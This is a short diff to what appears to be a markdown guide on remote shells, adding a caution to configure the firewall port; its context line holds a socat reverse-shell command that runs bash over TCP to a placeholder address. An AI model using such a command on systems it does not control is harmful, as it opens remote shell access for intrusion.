@@ -379,6 +379,9 @@ On the **target** (your device):
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your-ip>:<port>
 ```
 
+> [!CAUTION]
+> **DO NOT FORGET TO CONFIGURE YOUR FIREWALL TO ACCEPT TRAFFIC ON THE SPECIFIED PORT!"**
+
 #### How to add encryption:
 **Listener**
 ```bash
